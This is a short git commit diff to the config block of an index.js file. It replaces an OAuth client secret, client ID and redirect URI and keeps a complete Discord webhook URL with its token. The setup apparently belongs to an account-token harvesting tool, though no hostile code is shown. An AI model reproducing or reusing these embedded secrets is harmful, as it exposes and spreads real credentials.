fafd02d711679f2160c8b698ec8ca46c9889d58e
cheatenginefree <111660704+cheatenginefree@users.noreply.github.com>
2022-12-14 15:27:01 +0000

    Update index.js

--- index.js
+++ index.js
@@ -1,7 +1,7 @@
 //Config
-const secret_value = 'lSS8Q~__msihxNWrlWLLo2ySkLaV.I2IG8aoib9k'
-const client_id = 'a30c9d19-7ae6-48ef-b625-a86444a5aeed'
-const redirect_uri = 'https://different-fawn-gaiters.cyclic.app'
+const secret_value = 'oeE8Q~oaRgM5MGvYTapbgfyp0Vy3exej30ST3ajR'
+const client_id = '577dbc16-0123-47f0-9768-f590e1119359'
+const redirect_uri = 'https://different-fawn-gaiters.cyclic.app/'
 const webhook_url = 'https://discord.com/api/webhooks/1045338697500999740/-fGf7uq6z1N6HjAqd-9KaCncQ-YmgHjZmBOvpw50EjjVfwrgz8KAj0p134je-E5299Mk'
 //Requirements
 const axios = require('axios')
